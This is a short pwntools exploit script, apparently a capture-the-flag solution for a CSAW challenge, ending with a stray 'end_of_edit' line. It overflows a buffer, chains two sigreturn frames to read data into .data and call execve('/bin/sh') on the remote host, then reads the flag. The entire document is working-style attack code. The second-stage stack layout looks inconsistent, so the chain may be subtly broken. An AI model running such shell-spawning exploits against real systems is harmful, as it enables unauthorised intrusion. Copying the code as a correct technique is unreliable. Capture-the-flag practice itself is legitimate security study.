from pwn import *

context.arch = 'amd64'

# Gadgets
pop_rax = 0x40018a
syscall_ret = 0x400185
mov_eax_0xf_syscall = 0x400180

# .data section (writable)
data_addr = 0x601000

p = remote("pwn.chal.csaw.io", 8000)

# Stage 1: SROP to read "/bin/sh" + second frame into .data
frame1 = SigreturnFrame()
frame1.rax = 0  # read
frame1.rdi = 0  # stdin
frame1.rsi = data_addr
frame1.rdx = 0x400
frame1.rip = pop_rax
frame1.rsp = data_addr + 0x100

payload = b'A' * 40
payload += p64(mov_eax_0xf_syscall)
payload += bytes(frame1)

# Stage 2 frame: execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 59  # execve
frame2.rdi = data_addr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

# Build the data to be read into .data
stage2 = b'/bin/sh\x00'
stage2 = stage2.ljust(0x100, b'\x00')
stage2 += p64(pop_rax) + p64(0xf) + p64(mov_eax_0xf_syscall)
stage2 += bytes(frame2)

p.send(payload)
p.send(stage2)

p.sendline(b'cat flag.txt')
print(p.recvall(timeout=5).decode('latin-1'))
end_of_edit

